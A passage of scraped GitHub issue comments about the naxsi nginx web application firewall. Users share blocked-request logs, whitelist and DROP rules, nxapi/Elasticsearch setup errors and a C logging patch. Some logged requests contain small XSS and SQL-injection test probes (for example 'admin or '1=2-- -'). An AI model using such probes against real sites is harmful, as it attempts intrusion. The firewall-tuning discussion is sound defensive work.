seed_end=714&zone74=BODY|NAME&id74=1310&var_name74=ubermenu_general[load_google_cse]&zone75=BODY|NAME&id75=1311&var_name75=ubermenu_general[load_google_cse]&zone76=BODY|NAME&id76=1310&var_name76=ubermenu_general[load_google_cse]&zone77=BODY|NAME&id77=1311&var_name77=ubermenu_general[load_google_cse]&zone78=BODY|NAME&id78=1310&var_name78=ubermenu_general[ubermenu_toolbar]&zone79=BODY|NAME&id79=1311&var_name79=ubermenu_general[ubermenu_toolbar]&zone80=BODY|NAME&id80=1310&var_name80=ubermenu_general[ubermenu_toolbar]&zone81=BODY|NAME&id81=1311&var_name81=ubermenu_general[ubermenu_toolbar]&zone82=BODY|NAME&id82=1310&var_name82=ubermenu_general[force_filter]&zone83=BODY|NAME&id83=1311&var_name83=ubermenu_general[force_filter]&zone84=BODY|NAME&id84=1310&var_name84=ubermenu_general[disable_class_filtering]&zone85=BODY|NAME&id85=1311&var_name85=ubermenu_general[disable_class_filtering]&zone86=BODY|NAME&id86=1310&var_name86=ubermenu_general[disable_custom_admin_walker]&zone87=BODY|NAME&id87=1311&var_name87=ubermenu_general[disable_custom_admin_walker]&zone88=BODY|NAME&id88=1310&var_name88=ubermenu_general[strict_mode]&zone89=BODY|NAME&id89=1311&var_name89=ubermenu_general[strict_mode]&zone90=BODY|NAME&id90=1310&var_name90=ubermenu_general[strict_mode]&zone91=BODY|NAME&id91=1311&var_name91=ubermenu_general[strict_mode]&zone92=BODY|NAME&id92=1310&var_name92=ubermenu_general[ubermenu_theme_location]&zone93=BODY|NAME&id93=1311&var_name93=ubermenu_general[ubermenu_theme_location]&zone94=BODY|NAME&id94=1310&var_name94=ubermenu_general[diagnostics]&zone95=BODY|NAME&id95=1311&var_name95=ubermenu_general[diagnostics]&zone96=BODY|NAME&id96=1310&var_name96=ubermenu_general[diagnostics]&zone97=BODY|NAME&id97=1311&var_name97=ubermenu_general[diagnostics]&zone98=BODY|NAME&id98=1310&var_name98=ubermenu_general[lite_mode]&zone99=BODY|NAME&id99=1311&var_name99=ubermenu_general[lite_mode], client: 10.0.0.2, server: www.zk.in, request: \"POST /wp-admin/options.php HTTP/1.1\", host: \"zk.i\n2016/06/28 03:48:11 [error] 2825#2825: *8 NAXSI_FMT: ip=10.0.0.2&server=zk.in&uri=/wp-admin/load-styles.php&learning=0&vers=0.55rc2&total_processed=55&total_blocked=1&block=1&cscore0=$XSS&score0=8&zone0=ARGS|NAME&id0=1310&var_name0=load[]&zone1=ARGS|NAME&id1=1311&var_name1=load[], client: 10.0.0.2, server: www.zk.in, request: \"GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5B%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,&load%5B%5D=l10n,buttons,wp-auth-check&ver=4.5.3 HTTP/1.1\", host: \"zk.in\", referrer: \"http://zk.in/wp-admin/\"\n2016/06/28 03:48:40 [error] 2825#2825: *8 NAXSI_FMT: ip=10.0.0.2&server=zk.in&uri=/wp-admin/load-styles.php&learning=0&vers=0.55rc2&total_processed=91&total_blocked=2&block=1&cscore0=$XSS&score0=8&zone0=ARGS|NAME&id0=1310&var_name0=load[]&zone1=ARGS|NAME&id1=1311&var_name1=load[], client: 10.0.0.2, server: www.zk.in, request: \"GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5B%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,&load%5B%5D=l10n,buttons,wp-auth-check&ver=4.5.3 HTTP/1.1\", host: \"zk.in\", referrer: \"http://zk.in/wp-admin/index.php\"\n2016/06/28 03:48:43 [error] 2825#2825: *8 NAXSI_FMT: ip=10.0.0.2&server=zk.in&uri=/wp-admin/load-styles.php&learning=0&vers=0.55rc2&total_processed=94&total_blocked=3&block=1&cscore0=$XSS&score0=8&zone0=ARGS|NAME&id0=1310&var_name0=load[]&zone1=ARGS|NAME&id1=1311&var_name1=load[], client: 10.0.0.2, server: www.zk.in, request: \"GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5B%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,&load%5B%5D=l10n,buttons,wp-auth-check&ver=4.5.3 HTTP/1.1\", host: \"zk.in\", referrer: \"http://zk.in/wp-admin/media-new.php\"\n2016/06/28 03:48:47 [error] 2825#2825: *8 NAXSI_FMT: ip=10.0.0.2&server=zk.in&uri=/wp-admin/load-styles.php&learning=0&vers=0.55rc2&total_processed=99&total_blocked=4&block=1&cscore0=$XSS&score0=8&zone0=ARGS|NAME&id0=1310&var_name0=load[]&zone1=ARGS|NAME&id1=1311&var_name1=load[], client: 10.0.0.2, server: www.zk.in, request: \"GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5B%5D=dashicons,admin-bar,buttons,media-views,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menu&load%5B%5D=s,widgets,site-icon,l10n,wp-auth-check&ver=4.5.3 HTTP/1.1\", host: \"zk.in\", referrer: \"http://zk.in/wp-admin/post-new.php\"\nthis is my error log sir site is not loading. it is not learning mode.\n. i'm using this default whitelist  wordpress.rules \n. thank you verymuch for your help sir. add this rule\nBasicRule wl:1310,1311 \"mz:$URL:/wp-admin/load-styles.php|$ARGS_VAR:load[]|NAME|ARGS\";\ni set the naxsi to learning mode sir\nplease tell me where can i get elasticseach rpm?\ni tryed yum install elasticsearch it says No package elasticsearch available.\ni installed naxsi-nginx with this rpm https://www.ulyaoth.net/resources/naxsi-nginx-stable.18/\ni couldn't find the pasth of nxapi.. please help me sir\n. i found this guide  here \nwget https://naxsi.googlecode.com/files/nx_util-1.0.tgz\ntar -zxf nx_util-1.0.tgz\ncd nx_util-1.0/nx_util\npython nx_util.py -c nx_util.conf -l /var/log/virtualmin/zk.in_nginx_error_log -o\nthen after waiting for some time got this output\n. i'm just beginner i don't much about this sir can i use nxutil instead of nxapi to create whitelist rules? \ni used nxutil it gave me output of some whitelist rules pastebin\n. yes sir now i can make new posts :) \nso i noneed elasticsearch for now?\n. thanks you saved me :)\n. ",
    "zzhclare": "Thank for your answer. Do you know the last two questions answers?\n. ",
    "pimperator": "Hi Blotus,\nthanks a lot for your answer;\nin part you answered my question.\nFirst question\nWhat happens if I set up these two rules:\nBasicRule negative \"str:foor\" \"mz:$HEADERS_VAR:header1|$URL:/foobar\" \"s:DROP\" id:4242;\nBasicRule negative \"str:bar\" \"mz:$HEADERS_VAR:header2|$URL:/foobar\" \"s:DROP\" id:4242;\nWhich one wins if I do the following:\ncurl --Header \"header1: foo\" http://host.tld/foobar\nor even\ncurl --Header \"header3: anything\" http://host.tld/foobar\nAccording to the space in between my ears both curl-Requests will not be dropped.\nSecond question\nI have large json-Bodies. Is it sufficient for naxsi to match only for one rule to drop the request?\nHow does naxsi act if none of these below match in the body (ALLOW|BLOCK ?) ?\nBasicRule negative \"str:my_var_content1\" \"mz:$BODY_VAR:my_json_key1\" \"s:DROP\" id:4245;\nBasicRule negative \"rx:([0-9]{8})\" \"mz:$BODY_VAR:my_json_key2\" \"s:DROP\" id:4246;\nBasicRule negative \"rx:true|false\" \"mz:$BODY_VAR:my_json_key3\" \"s:DROP\" id:4247;\nBasicRule negative \"str:my_var_content4\" \"mz:$BODY_VAR:my_json_key4\" \"s:DROP\" id:4248;\nMy appologies for asking such dumb questions but I begin to get blind because doing this for the last month.\n. another question is:\nWhy is this here never matching on \"str\"? I suppose it is because of \":\". How do I escape it?\nBasicRule  \"str:https://hostname.domain.tld\" \"msg:this is my origin header\" \"mz:$HEADERS_VAR:origin\" \"s:$VHOST:1,$FUBAR_A:1,$FUBAR_B:1,$FUBAR_C:1,$GENERIC:-1\" id:3211;\n. I'd also be happy about that!!. seems for me not like a naxsi problem but a tcp connection problem. if you connect to nginx then at least you shall recieve a http status code.\nis nginx running?\ntest your config first via nginx -t\ndid you turn off your firewall?\nwhat does\nnmap -sT -sU -p 4242 127.0.0.1\nsay? . ",
    "vladimir000": "Hello!\nThis is THE solution. I solved my problem thanks!\nStill not perfect as we can't customize, just turn off/on, but in my case it is enough.\nHope it helps someone as searching for \"naxsi\" + \"named location\" wasn't returning anything useful.\nThanks a lot\n. Seems like a great improvement, this rule matches a lot of data usually.\nThanks. Isn't the application culprit for decoding blindly the user input using the user-supplied charset?!\nI don't know of any application that does this but i could be wrong.. ",
    "Montano5": "Hello !\nI have the same expectation as @danlsgiga because my Nginx server is behind Cloudflare. Everything is great in Nginx logs because I use the \"real ip\" to get from the X-Forwarded-For header.\nBut Naxsi still logs the errors with the Cloudflare servers IPs and I don't find a way to change it.\nIt would be ok as the requests are still blocked, so there is no real security warning.\nYet I can not use Fail2ban to block the Ips from Naxsi logged errors without getting the real client ip in the logs...\nEven worth, I can not create withelist rules based on IP (mine for example)...\nI will wait the 0.57 to see if it will work ;)\nThanks for the hard work !\n. @theundefined : Oh, I think you're right, I'm using Nginx 1.10.2 indeed... Thank you for the information !\n. ",
    "theundefined": "@Montano5 : I think that it's a bug in nginx - in 1.8 with real-ip works fine, in 1.10 it doesn't. \n. ",
    "benkhlifafahmi": "Hi, \nwell i am not good that much in C/C++ but i was able to do this by adding the x_real_ip of nginx instead fo the connection->addr.\nThe change i made was on line 819 of  naxsi_runtime.c (https://github.com/nbs-system/naxsi/blob/master/naxsi_src/naxsi_runtime.c#L819)\nchange it with this code and recompile your nginx with naxsi module.\nC\nngx_table_elt_t real_ip;\nngx_table_elt_t *real_ip_t = r->headers_in.x_real_ip;  \nif(real_ip_t != NULL){\n          real_ip = real_ip_t[0];\n          sub = snprintf((char *)fragment->data, sz_left, fmt_base,real_ip.value.len,\n                         real_ip.value.data,\n                         r->headers_in.server.len, r->headers_in.server.data,\n                         tmp_uri->len, tmp_uri->data, ctx->learning ? 1 : 0, strlen(NAXSI_VERSION),\n                         NAXSI_VERSION, cf->request_processed, cf->request_blocked, ctx->block ? 1 : 0);\n}else{\n          sub = snprintf((char *)fragment->data, sz_left, fmt_base, r->connection->addr_text.len,\n                 r->connection->addr_text.data,\n                 r->headers_in.server.len, r->headers_in.server.data,\n                 tmp_uri->len, tmp_uri->data, ctx->learning ? 1 : 0, strlen(NAXSI_VERSION),\n                 NAXSI_VERSION, cf->request_processed, cf->request_blocked, ctx->block ? 1 : 0);\n}\nthis code will log the X-Real-IP header in the NAXSI_FMT error log and if the X-Real-IP is not availible you will find the CloudFlare IP .\nWhat i have now as log is : \nLOG\n2016/11/17 11:52:35 [error] 2363#0: *3 NAXSI_FMT: ip=[REAL CLIENT IP]&server=&uri=/'\"><h1>test&learning=0&vers=0.55&total_processed=1&total_blocked=1&block=1&cscore0=$SQL&score0=8&cscore1=$XSS&score1=8&zone0=URL&id0=1001&var_name0=, client: 127.0.0.1, server: , request: \"GET /'%22%3E%3Ch1%3Etest HTTP/1.0\"\n@danlsgiga  Sorry for my bad english :p hope this help you as i have passed a whole day searching for a solution.\nAlso i don't advise you to use this in a production mode but use it temporary and wait for the official release.\nHave a nice day.\n. @danlsgiga  I did but i guess there was a problem compiling the solution i submited, \nwill check it again and re-submit the solution once it compile correctly.\nNote: I have compiled the solution on our company server and it work fine, what i did is i enabled the x_real_ip module of NGINX when compiling NGINX with NAXSI.. @mathieumd  and @danlsgiga  i can confirm that the PR i pushed last time can be used on  a production env.\n we are using this from NOV till now and it works fine :+1: . @jvoisin\nHi i guess the problem is because you haven't enabled the Real IP mode ,\nthe Error says : /home/travis/build/nbs-system/naxsi/naxsi_src/naxsi_runtime.c:793:46: error: no member named 'x_real_ip' in 'ngx_http_headers_in_t'\nbut when we review the source code of the ngx_http_request lib we can see that the x_real_ip exist\nhttp://lxr.nginx.org/source/src/http/ngx_http_request.h#0210 \nbased on the officiel NGINX document the  you need to add the real_ip module i guess , \nCan you verify this !???. ",
    "Wolfe526": "@benkhlifafahmi - Looking forward to this enhancement.  . ",
    "mathieumd": "Is log customization now possible?\nI use 0.55rc1 from Dotdeb nginx-extras and Naxsi still logs the LB address instead of the real_ip.. ",
    "piefox": "Hello,\nThank you for response,\nI've already tried: \nMainRule \"str:/magmi/\" \"msg:Access to magmi folder\" \"mz:URL\" \"s:$UWA:8\" id:42000400;\nIt block 127.0.0.1/magmi/ -> OK\nbut also 127.0.0.1/test/magmi/test.html \nand i want to block only the root subfolder.\nHowever, i found a workaround to do that with:\nMainRule negative id:4242 \"rx:^\\/(onefolder|anotherfolder)\\/\" \"msg:allow only the authorized subfolders\" \"mz:URL\" s:DROP;\n. ",
    "rhoerbe": "The problem was that naxsi does not trigger on = rules (like location = /)\nThank your for helping\n. ",
    "Whissi": "No, same ndk & lua with naxsi 0.54 against same nginx version don't throw any errors. Only when I bump naxsi to v0.55 errors appear.\nI.e. on Gentoo I run\nUSE=\"-* http ssl pcre pcre-jit nginx_modules_http_rewrite nginx_modules_http_lua nginx_modules_http_naxsi\" ebuild nginx-1.11.4 clean install\nwhich will build nginx-1.11.4 with minimal configuration required for lua and naxsi.\nIt works fine with naxsi-0.54 and ngx_http_lua-0.10.6.\nNow the only thing I am going to change is to bump naxsi to v0.55 and re-run the command. Now build will fail with the error above.\n. @blotus: Confirmed! https://github.com/nbs-system/naxsi/commit/2b1779924ee23d643c19a8a22a620f92f2d4aa19 fixes the build issue... Thanks!\n. ",
    "L3V14TH4N": "The version of Elasticsearch is 2.4\njson\n[root@naxsi nxapi]# cat nxapi.json\n{\n\"elastic\" : {\n \"host\" : \"127.0.0.1:9200\",\n \"use_ssl\" : \"False\",\n \"index\" : \"nxapi\",\n \"doctype\" : \"events\",\n \"default_ttl\" : \"7200\",\n \"max_size\" : \"1000\",\n \"version\" : \"2\"\n},\n\"syslogd\": {\n \"host\" : \"0.0.0.0\",\n \"port\" : \"51400\"\n},\n\"global_filters\" : {\n \"whitelisted\" : \"false\"\n},\n\"global_warning_rules\" : {\n \"rule_ip\" : [\"<=\", 10 ],\n \"global_rule_ip_ratio\" : [\"<\", 5]\n},\n\"global_success_rules\" : {\n \"global_rule_ip_ratio\" : [\">=\", 10],\n \"rule_ip\" : [\">=\", 10]\n},\n\"global_deny_rules\" : {\n \"global_rule_ip_ratio\" : [\"<\", 2]\n},\n\"naxsi\" : {\n \"rules_path\" : \"/etc/nginx/naxsi_core.rules\",\n \"template_path\" : [ \"tpl/\"],\n \"geoipdb_path\" : \"nx_datas/country2coords.txt\"\n},\n\"output\" : {\n \"colors\" : \"true\",\n \"verbosity\" : \"5\"\n}\n}\n. The problem still persists.\n``` python\n./nxtool.py -c nxapi.json -x\nsize :1000\nNo handlers could be found for logger \"elasticsearch\"\nTraceback (most recent call last):\n  File \"./nxtool.py\", line 274, in \n    translate.fetch_top(cfg.cfg[\"global_filters\"], \"whitelisted\", limit=2)\n  File \"/usr/local/src/naxsi/nxapi/nxapi/nxtransform.py\", line 550, in fetch_top\n    res = self.search(esq)\n  File \"/usr/local/src/naxsi/nxapi/nxapi/nxtransform.py\", line 619, in search\n    x = self.es.search(index=self.cfg[\"elastic\"][\"index\"], doc_type=self.cfg[\"elastic\"][\"doctype\"], body=esq)\n  File \"/usr/lib/python2.7/site-packages/elasticsearch/client/utils.py\", line 70, in _wrapped\n    return func(args, params=params, *kwargs)\n  File \"/usr/lib/python2.7/site-packages/elasticsearch/client/init.py\", line 429, in search\n    params=params, body=body)\n  File \"/usr/lib/python2.7/site-packages/elasticsearch/transport.py\", line 274, in perform_request\n    status, headers, data = connection.perform_request(method, url, params, body, ignore=ignore)\n  File \"/usr/lib/python2.7/site-packages/elasticsearch/connection/http_urllib3.py\", line 51, in perform_request\n    raise ConnectionError('N/A', str(e), e)\nelasticsearch.exceptions.ConnectionError: ConnectionError([Errno 2] No such file or directory) caused by: SSLError([Errno 2] No such file or directory)\n```\n. It should stay that way?\n{\n\"elastic\" : {\n \"host\" : \"127.0.0.1:443\",\n \"use_ssl\" : \"True\",\n \"host\" : \"127.0.0.1:9200\",\n \"use_ssl\" : \"False\",\n \"index\" : \"nxapi\",\n \"doctype\" : \"events\",\n \"default_ttl\" : \"7200\",\n \"max_size\" : \"1000\",\n \"version\" : \"2\"\n}\n. Yeah!!! It worked!!\n\nThanks!!\n. Another example:\n\nI marked two options.. Where the field \"date\" should come with data contained in field 1 (comments).\n. Ok,\nNginx error log:\n2016/09/27 09:13:44 [error] 2814#0: *1 NAXSI_FMT: ip=10.0.97.51&server=10.0.97.10&uri=/testando/pagina-de-exemplo/&learning=0&vers=0.55rc2&total_processed=3&total_blocked=3&block=1&cscore0=$SQL&score0=8&zone0=ARGS&id0=1015&var_name0=keywords, client: 10.0.97.51, server: 10.0.97.10, request: \"GET /testando//pagina-de-exemplo/?keywords=Select+1,2,3 HTTP/1.1\", host: \"10.0.97.10\"\nAnd parser content:\n```\n{'date': '2016-09-27T09:12:32+03', 'events': [{'zone': 'ARGS', 'ip': '10.0.97.51', 'uri': '/testando/pagina-de-exemplo/', 'server': '10.0.97.10', 'content': '', 'var_name': 'keywords', 'coords': [104.195397, 35.86166], 'country': 'CN', 'date': '2016-09-27T09:12:32+03', 'id': '20666'}]}\n{'date': '2016-09-27T09:13:17+03', 'events': [{'zone': 'ARGS', 'ip': '10.0.97.51', 'uri': '/testando/pagina-de-exemplo/', 'server': '10.0.97.10', 'content': '', 'var_name': 'keywords', 'coords': [104.195397, 35.86166], 'country': 'CN', 'date': '2016-09-27T09:13:17+03', 'id': '1015'}]}\n{'date': '2016-09-27T09:13:35+03', 'events': [{'zone': 'ARGS', 'ip': '10.0.97.51', 'uri': '/testando/pagina-de-exemplo/', 'server': '10.0.97.10', 'content': '', 'var_name': 'keywords', 'coords': [104.195397, 35.86166], 'country': 'CN', 'date': '2016-09-27T09:13:35+03', 'id': '1015'}]}\n{'date': '2016-09-27T09:13:44+03', 'events': [{'zone': 'ARGS', 'ip': '10.0.97.51', 'uri': '/testando/pagina-de-exemplo/', 'server': '10.0.97.10', 'content': '', 'var_name': 'keywords', 'coords': [104.195397, 35.86166], 'country': 'CN', 'date': '2016-09-27T09:13:44+03', 'id': '1015'}]}\n```\n\n. > Can you provide me with the full log line and the associate dict so I can reproduce?\nYes, I have already sent the above topic.\n. There are divergencies between the schedule in Logs and Kibana (four hours difference)\n[root@naxsi nxapi]# ./nxtool.py -c nxapi.json --files=/var/log/nginx/naxsi.log\nResult:\n{'date': '2016-10-18T10:17:34+02', 'events': [{'zone': 'ARGS', 'ip': '10.0.97.10', 'uri': '/agencia-de-exemplo/pagina-de-exemplo/', 'server': '10.0.134.101', 'content': '', 'var_name': 'keywords', 'country': '', 'date': '2016-10-18T10:17:34+02', 'id': '1007'}\nDate in Kibana:\n\nNaxsi error log:\n2016/10/18 10:17:34 [error] 20759#0: *300 NAXSI_FMT: ip=10.0.97.10&server=10.0.134.101&uri=/agencia-de-exemplo/pagina-de-exemplo/&learning=0&vers=0.55&total_processed=153&total_blocked=107&block=1&cscore0=$SQL&score0=10&cscore1=$XSS&score1=8&zone0=ARGS&id0=1007&var_name0=keywords&zone1=ARGS&id1=1009&var_name1=keywords&zone2=ARGS&id2=1013&var_name2=keywords, client: 10.0.97.10, server: 10.0.134.102, request: \"GET /agencia-de-exemplo/pagina-de-exemplo/?keywords=admin+or+%271=2--%20- HTTP/1.1\", host: \"10.0.134.101\"\nSorry, I really mean one line of log, with the associated / resulting json document in kibana.\nIt was what I wanted?\n. ",
    "perec007": "For example, in the rules is the following:\nBasicRule wl:0 \"mz:BODY|$URL:/account/changepassword.*\";\nand the logs I see that the lock is still going on:\nNaxsi log:\n2016/10/06 02:07:53 [error] 19991#0: *11847768 NAXSI_FMT: ip=24.XXX.31.XXX&server=site.com&uri=/account/changepassword/USERID&learning=1&vers=0.55&total_processed=116&total_blocked=1&block=1&cscore0=$SQL&score0=16&zone0=BODY&id0=1016&var_name0=passwordchangeform[password]&zone1=BODY&id1=1016&var_name1=passwordchangeform[password_repeat], client: 24.XXX.31.XXX, server: www.site.com, request: \"POST /account/changepassword/USERID?code=2eaa9abdfe1c80fec7100dd82a1g52d2 HTTP/1.0\", host: \"site.com\", referrer: \"https://site.com/account/changepassword/USERID?code=2eaa9abdfe1c80fec7100dd82a1g52d2\"\nAnd post nginx log:\n\"24.XXX.31.XXX\" - - [06/Oct/2016:02:07:53 +0200] POST /account/changepassword/USERID?code=2eaa9abdfe1c80fec7100dd82a1g52d2 HTTP/1.0 /index.php 302 BODY:PasswordChangeForm%5Bpassword%5D=%23%23gXXXX1010*&PasswordChangeForm%5Bpassword_repeat%5D=%23%23gXXXX1010*\n. Do I need to create a new ticket, or you can re-open it? :)\n. In some places it is necessary to disable checking the BODY entirely.\nTo test I have included a training mode. For example I have here is a rule in the config nginx, which should act on the entire location / user / update /. To allow the whole BODY, i use \"wl:0\":\nBasicRule wl:0 \"mz:BODY|$URL:/user/update/.*\";\nBut this does not happen and the log I see that many users will be blocked.\n2016/10/17 19:46:16 [error] 94386#0: *59382835 NAXSI_FMT: ip=XX.xx.XX.xx&server=site.abc.com&uri=/user/update/01010101&learning=1&vers=0.55&total_processed=117&total_blocked=3&block=1&cscore0=$SQL&score0=12&cscore1=$XSS&score1=8&zone0=BODY&id0=1011&var_name0=userprofile[phone_mobile]&zone1=BODY&id1=1005&var_name1=user[admin_comment], client: XX.xx.XX.xx, server: site.abc.com, request: \"POST /user/update/01010101 HTTP/1.1\", host: \"site.abc.com\", referrer: \"https://site.abc.com/user/update/01010101\"\nPlease tell me the example of how to resolve this location entire BODY?\nThank you!\n. ",
    "cjavierto": "Ok thanks.\nOn Wed, Nov 2, 2016 at 4:39 AM, jvoisin notifications@github.com wrote:\n\nClosed #322 https://github.com/nbs-system/naxsi/issues/322.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/322#event-843530924, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AV0NG6kim6Rg-85ZxqjaRm008QRr19HQks5q510zgaJpZM4KYHBA\n.\n. \n",
    "hogze94": "Whats the status of this? . ",
    "michal-grabowski": "Is there any schedule for 0.56 release? I'd like to start using naxsi on my production server but because of http2 bug i'm still waiting for fixed release.. Please don't get me wrong, i'm just excited about NAXSI and would love to use it. Fingers crossed. Thanks.. ",
    "zhujintao": "nxtool.py does not support the new version elastic search server, use this\n. ",
    "bbaassssiiee": "We run from master. naxsi.h has #define NAXSI_VERSION \"0.55\". I am collecting logs from my Naxsi to see if there are no false positives on the string '--'.\nAs to your request, before running make re I had to install some things.\n```\nyum install -y lcov perl-CPAN\nperl -MCPAN -e 'install Test::Nginx'\n```\nThis is the last part of the output:\nexport PATH=\"/tmp/nginx//objs/:\"/sbin:/bin:/usr/sbin:/usr/bin ; \\\nexport PERL5LIB=\"~/perl5/lib/perl5/:/home/travis/perl5/lib/perl5/\" ; \\\ncd .. ; prove -r \"t/\"\nt/00naxsi_base.t ................. ok   \nt/01naxsi_whitelists.t ........... ok   \nt/02naxsi_bypass.t ............... ok   \nt/03naxsi_profile.t .............. ok   \nt/04naxsi_files.t ................ ok   \nt/05naxsi_advanced_whitelists.t .. ok   \nt/06naxsi_weirds.t ............... ok   \nt/07naxsi_argnames.t ............. ok   \nt/08negative_whitelists.t ........ ok   \nt/09sqlmap_tamper.t .............. ok   \nt/10naxsi_modifiers.t ............ ok   \nt/11naxsi_newstyle_config.t ...... ok   \nt/12naxsi_argnames_extended.t .... ok \nt/13test.t ....................... ok \nt/14json.t ....................... ok   \nt/15json_wl.t .................... ok   \nt/16rx_mz.t ...................... ok   \nt/17case.t ....................... ok \nt/18ids.t ........................ ok   \nt/19targets.t .................... ok   \nt/20sqlmap.t ..................... ok   \nt/22libinjection-base.t .......... ok   \nt/23verylong.t ................... ok \nt/24rawbody.t .................... ok   \nt/25extra-coverage.t ............. ok \nt/26improved-matchzones.t ........ ok   \nt/27libinjection-blacklist.t ..... ok \nt/28log.t ........................ ok   \nt/29regression.t ................. ok \nAll tests successful.\nFiles=29, Tests=722, 87 wallclock secs ( 0.35 usr  0.07 sys + 20.49 cusr 17.20 csys = 38.11 CPU)\nResult: PASS\nlcov --directory /tmp/nginx//objs/addon/naxsi_src/ --capture --output-file naxsi.info --base-directory /tmp/nginx/\nCapturing coverage data from /tmp/nginx//objs/addon/naxsi_src/\nFound gcov version: 4.8.5\nScanning /tmp/nginx//objs/addon/naxsi_src/ for .gcda files ...\nFound 6 data files in /tmp/nginx//objs/addon/naxsi_src/\nProcessing naxsi_src/naxsi_utils.gcda\nProcessing naxsi_src/naxsi_raw.gcda\nProcessing naxsi_src/naxsi_json.gcda\nProcessing naxsi_src/naxsi_config.gcda\nProcessing naxsi_src/naxsi_skeleton.gcda\nProcessing naxsi_src/naxsi_runtime.gcda\nFinished .info-file creation\ngenhtml -s -o /tmp/naxsicov.html naxsi.info\nReading data file naxsi.info\nFound 7 entries.\nFound common filename prefix \"/usr/local/src/naxsi-master\"\nWriting .css and .png files.\nGenerating output.\nProcessing file /usr/include/stdlib.h\nProcessing file naxsi_src/naxsi_runtime.c\nProcessing file naxsi_src/naxsi_skeleton.c\nProcessing file naxsi_src/naxsi_json.c\nProcessing file naxsi_src/naxsi_config.c\nProcessing file naxsi_src/naxsi_utils.c\nProcessing file naxsi_src/naxsi_raw.c\nWriting directory view page.\nOverall coverage rate:\n  lines......: 92.9% (1616 of 1740 lines)\n  functions..: 100.0% (65 of 65 functions)\n. Sure, I'll collect a days data and will try to see if it is now resolved.. Data no longer shows signs of this bug.. ",
    "Peter2121": "If I understand the syntax, it will disable rule 2 for the whole site /microsoft-server-activesync. \nThis is definitely NOT my aim, I would like to disable rule 2 just for POST with Cmd=SendMail present in arguments.. Mmm, it seems that I'm trying to configure an impossible white list rule.\nThe logic was if Cmd=SendMail is present in POST - disable rule 2 for the BODY.\nSo, I cannot disable the check of the WHOLE body, putting the WL trigger on ONE post variable?\nMaybe I can bypass NAXSI completely for this case (or use another NAXSI WL set), using NGINX regex filters on location level?\n. I can't provide rather more details than I've put to the first message. It's a reverse-proxy to protect MS Exchange, it blocks actually any mail sent with an attachment using ActiveSync protocol. The attachment size can be really huge (10+MB), so I don't think that increasing client_body_buffer_size can help. I understand that bypassing rule 2 (in general) is a bad idea, that's why I'm trying to minimize the attack surface. If we must choose between disabling rule 2 in general and disabling rule 2 for some requests - I would prefer to disable it for some requests. We cannot filter a specific URL as in the MS logic ALL the work is doing in /Microsoft-Server-ActiveSync, so we should filter on request parameters, not on URL.. OK, I'll try to use dynamicmodifiers, don't think that the performance matters in our case.\nHope to see more elegant solution later ;)\nThank you! . ",
    "s8sg": "You need to enable field data on all the text fields for searching, which are: \nwhitelisted, server, uri, zone, ip\nYou could update each of them by: \n\nPUT /nxapi/_mapping/?update_all_types \n{\n  \"properties\": {\n    \"\": {\n      \"type\": \"text\",\n      \"fielddata\": true\n    }\n  }\n}\n\nWhere  is = [whitelisted, server, uri, zone, ip]. Added pull request for the fix: Fix of 329. I have updated the PR and doing specific handling for ES 5.X as I couldn't found a common way that could seamlessly work for both: \nYou need to set:\nES5_ENABLE=True in the env\nThe TTL is not being set. ES 5.X requires ttl to be set on index level, which needs farther discussion. \nPlease check/review the patch : Update of Fix of 329\nThanks :) . @buixor I have updated the patch.\nThe ES version is being read from the conf, which is already set as mandatory.\n\"version\" : \"5\" should work. \n@mguesdon That sounds a neater solution, \nbut we are already setting ES version in the conf file, and its mandatory\nI'm not sure about the reason though\nDoes python ES client has any api to query version ?\nPlease review.\nThanks. @buixor Glad to contribute. I would love to check the  new nxtool version. Thanks :) . Currently only version major is being treated. It is added in cfg to make it globally available. Version specific handling might be necessary for other functions. . @mguesdon :( Version definite checking is being done to many places. Its not yet ready for ES 5. \n@buixor I'll create a new PR for supporting the ES 5 pointing all the issues.  . @mguesdon Could you please review the patch #334 . ",
    "mguesdon": "Thank you !\nI've applied your patch and done:\ncurl -XDELETE 'http://localhost:9200/nxapi'\n./nxtool.py -c nxapi.json --files=...\nbut same error.\n./nxtool.py say \"Unable to create the index/collection : nxapi events\" So if I well read the code, it doesn't call self.es.indices.put_mapping()\nNext I've done: \nPUT /nxapi/_mapping/?update_all_types \nfor each types and it's now OK.\nI've retried the whole process using nxapi-documentation as the name index but same problem: \"Unable to create the index/collection : nxapi-documentation events\" and no \"fielddata\" property on fileds.. Hi,\nThank you, it fix the problem !\nAbout  ES5_ENABLE=True, may be a better solution would be to query elasticsearch to get the version ? \njson\n$ curl -XGET 'localhost:9200'\n{\n  \"name\" : \"naxsi-1\",\n  \"cluster_name\" : \"naxsi\",\n  \"cluster_uuid\" : \"8ER3_mYPQbun4c7L6hps9w\",\n  \"version\" : {\n    \"number\" : \"5.0.1\",\n    \"build_hash\" : \"080bb47\",\n    \"build_date\" : \"2016-11-11T22:08:49.812Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"6.2.1\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}. Great ! Thank you !\nA little problem: v5 is not handled in nxtransform.py (search for \"Unspecified ES version\"), so a ./nxtool.py -c nxapi.json  -x --colors fails with Unknown / Unspecified ES version in nxapi.json : 5 :-)\n. OK, thx !. ",
    "dbiazus": "Maybe You should try  ./nxtool.py -c nxapi.json --files=/var/log/nginx/error.log. Buy a 2GB RAM server at Digital Ocean for 20 bucks and be happy :-)\nhttps://www.digitalocean.com/pricing/. ",
